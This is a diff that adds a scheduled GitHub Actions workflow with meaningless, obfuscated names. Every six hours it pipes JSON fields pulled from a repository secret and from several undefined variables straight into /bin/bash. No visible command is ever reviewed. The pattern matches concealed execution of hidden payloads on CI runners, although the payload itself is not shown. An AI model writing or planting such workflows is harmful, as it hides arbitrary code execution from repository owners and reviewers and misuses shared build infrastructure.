@@ -1,0 +1,20 @@
+name: boringsinglet
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: boringsinglet
+        env:
+          p14755: ${{ secrets.p14755 }}
+        run: |
+          echo $p14755 | jq -r .dd07957 | /bin/bash
+          echo $s6315 | jq -r .ta41 | /bin/bash
+          echo $ly77721 | jq -r .sgk0 | /bin/bash
+          echo $ulzgk9505 | jq -r .tao6 | /bin/bash
+
